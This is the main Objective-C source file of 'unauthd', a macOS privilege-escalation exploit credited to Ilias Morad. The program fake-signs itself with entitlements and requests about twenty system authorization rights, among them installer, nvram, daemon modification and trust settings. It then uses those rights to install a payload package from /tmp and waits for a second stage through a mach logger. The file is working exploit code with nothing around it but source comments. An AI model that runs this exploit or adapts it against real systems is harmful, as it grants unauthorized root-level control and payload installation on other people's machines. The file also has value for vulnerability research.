//
//  main.m
//  unauthd
//
//  Created by Ilias Morad (A2nkF) on 1/1/20.
//  Copyright © 2020 Ilias Morad (A2nkF). All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <pwd.h>

#include <Security/Security.h>
#include <Foundation/Foundation.h>

#include "modules/uninstaller.h"
#include "modules/installer.h"
#include "mach_logger.h"


void uninstallApp(const char *path) {
    puts("[*] Uninstalling App!");
    NSString *location = [NSString stringWithUTF8String:path];
    [Uninstaller _uninstallApp:location];
}

void fail() {
    puts("[-] Aborting Exploit!");
    exit(-1);
}

void doSigning() {
    system("codesign -f -s - --entitlements /tmp/.tmp/entitlements.xml ./unauthd");
    puts("[+] Done!");
}

int getRights(AuthorizationRef *authorizationRef) {
    /*
     * The exploit, as it is, doesn't use all of these rights.
     * I included them anyways, to show how one could get all the rights
     * which might be useful for a different exploitation of this vulnerability.
     */
    AuthorizationItem right_items[] = {
        {"system.install.apple-software", 0, NULL, 0},
        {"system.preferences.nvram", 0, NULL, 0},
        {"com.apple.uninstalld.uninstall", 0, NULL, 0},
        {"com.apple.opendirectoryd.linkidentity", 0, NULL, 0},
        {"com.apple.ServiceManagement.daemons.modify", 0, NULL, 0},
        {"system.services.directory.configure", 0, NULL, 0},
        {"com.apple.trust-settings.user", 0, NULL, 0},
        {"system.install.apple-config-data", 0, NULL, 0},
        {"system.services.networkextension.filtering", 0, NULL, 0},
        {"system.install.software.iap", 0, NULL, 0},
        {"system.install.software.mdm-provided", 0, NULL, 0},
        {"system.install.apple-software.standard-user", 0, NULL, 0},
        {"system.services.systemconfiguration.network", 0, NULL, 0},
        {"com.apple.activitymonitor.kill", 0, NULL, 0},
        {"com.apple.XType.fontmover.restore", 0, NULL, 0},
        {"com.apple.security.assessment.update", 0, NULL, 0},
        {"system.services.networkextension.vpn", 0, NULL, 0},
        {"com.apple.SoftwareUpdate.scan", 0, NULL, 0},
        {"com.apple.SoftwareUpdate.modify-settings", 0, NULL, 0},
        {"system.preferences.security.remotepair", 0, NULL, 0},
    };
    
    AuthorizationRights rights = {20, right_items};
    AuthorizationFlags flags =  kAuthorizationFlagDefaults |
                                kAuthorizationFlagInteractionAllowed |
                                kAuthorizationFlagPreAuthorize |
                                kAuthorizationFlagExtendRights;

    OSStatus status = AuthorizationCopyRights(*authorizationRef, &rights, NULL, flags, NULL);
    
    printf("[*] Copy rights returned %d\n", status);
    fflush(stdout);

    return status;
}


int main(int argc, const char *argv[]) {
    AuthorizationRef authorizationRef = {0};
    mach_port_t server_port = MACH_PORT_NULL;
    
    puts("[~] Fakesigning myself with entitlements...");
    doSigning();

    assert(!AuthorizationCreate(NULL, NULL, kAuthorizationFlagDefaults, &authorizationRef));
    puts("[+] Got authorization!");

    puts("[~] Requesting rights...");
    if(getRights(&authorizationRef)) {
        fail();
    } else {
        puts("[+] Success!");
    }

    puts("[~] Preparing Stage2...");    
    loggerInit(&server_port);

    puts("[~] Installing Payload...");
    [Installer installPKG: @"file:///tmp/.tmp/macOSPublicBetaAccessUtility.pkg#macOSPublicBetaAccessUtility.pkg"
               withAuthorization:&authorizationRef
               toDest: @"/Volumes/.tmp"];

    loggerAwait(&server_port);

    while (1){}
    return 0;
}
